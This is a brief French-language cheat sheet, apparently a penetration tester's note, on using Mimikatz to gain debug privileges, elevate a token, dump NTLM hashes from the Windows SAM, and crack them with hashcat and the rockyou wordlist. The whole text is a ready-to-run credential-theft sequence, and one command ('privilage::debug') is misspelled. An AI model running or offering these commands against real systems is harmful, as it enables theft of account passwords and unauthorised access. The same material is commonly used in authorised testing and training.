# Mimikatz

Toujours executer ses commandes avant toutes action avec mimikatz

```sh
privilage::debug
token::elevate
```

Vider les hash 

```sh
lsadump::sam
lsadump::sam /path
```

Déchiffrez ces hachages avec hashcat

```sh
hashcat -m 1000 <hash> rockyou.txt
```